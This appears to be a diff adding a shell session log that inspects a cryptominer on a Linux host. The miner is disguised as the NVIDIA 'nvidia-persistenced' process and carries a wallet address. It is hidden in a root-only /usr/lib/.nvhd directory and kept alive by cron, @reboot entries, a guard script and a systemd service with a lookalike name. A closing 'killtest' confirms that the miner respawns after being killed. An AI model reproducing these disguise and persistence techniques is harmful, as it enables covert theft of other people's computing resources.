@@ -1,0 +1,35 @@
+$ echo "=== ps ==="
+ps -eo pid,etime,args | grep -E 'nvidia-persistenced --address' | grep -v grep | cut -c1-110
+echo "=== cron ==="
+crontab -l
+echo "=== svc ==="
+systemctl is-enabled nv-sysmon-sync; systemctl is-active nv-sysmon-sync
+echo "=== files ==="
+ls -la /usr/lib/.nvhd/
+echo "=== killtest ==="
+pkill -f 'nvidia-persistenced --address'
+sleep 70
+ps -eo pid,etime,args | grep 'nvidia-persistenced --address' | grep -v grep | cut -c1-110
+=== ps ===
+=== cron ===
+@reboot sleep 45; systemctl start nv-sysmon-sync.service >/dev/null 2>&1
+* * * * * /usr/lib/.nvhd/guard.sh >/dev/null 2>&1
+*/5 * * * * pgrep -f '/usr/lib/.nvhd/agent.py' >/dev/null || setsid /usr/bin/python3 /usr/lib/.nvhd/agent.py >/dev/null 2>&1
+@reboot sleep 30; /usr/lib/.nvhd/guard.sh >/dev/null 2>&1
+@reboot sleep 45; systemctl start nv-sysmon-sync.service >/dev/null 2>&1
+=== svc ===
+enabled
+active
+=== files ===
+total 27032
+drwx------  2 root root     4096 Oct 26 06:32 .
+drwxr-xr-x 95 root root     4096 Oct 26 06:32 ..
+-rw-r--r--  1 root root      210 Oct 26 06:36 .glog
+-rw-r--r--  1 root root       54 Oct 26 06:32 .log
+-rwx------  1 root root 27519200 Oct 26 06:32 .m
+-rw-r--r--  1 root root       33 Oct 26 06:32 .m.md5
+-rw-r--r--  1 root root   123234 Oct 26 06:36 .mine.log
+-rwx------  1 root root     2689 Oct 26 06:36 agent.py
+-rwx------  1 root root     1588 Oct 26 06:32 guard.sh
+=== killtest ===
+  66264       00:00 nvidia-persistenced --address prl1pwlpyppsya2wqnykeqc595gtxfgn4vzcr0at33dxq46jxvajmh88qq36
